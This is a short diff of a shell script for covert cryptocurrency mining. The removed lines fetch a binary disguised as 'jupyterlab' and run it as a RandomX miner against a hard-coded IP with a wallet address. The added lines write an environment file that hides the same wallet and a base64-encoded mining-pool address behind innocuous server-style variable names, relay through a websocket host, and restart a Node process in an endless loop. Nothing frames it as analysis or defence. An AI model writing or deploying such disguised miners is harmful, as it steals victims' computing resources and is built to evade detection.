@@ -1,4 +1,9 @@
-cd
-curl -s -L -o pluto https://github.com/Dirianda12/mainble/releases/download/mx/jupyterlab
-chmod 777 pluto
-./pluto -a randomx -o 185.84.98.5:443 -u 876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy -p ver3 -t 3
+#!/bin/bash
+CONNECT=$1
+NAME=$2
+echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
+SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+SERVER_DOMAIN=876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy
+SERVER_SECRET=app-2
+SERVER_CONNECTION=2" > .env
+while true; do node index.js; sleep 15; done
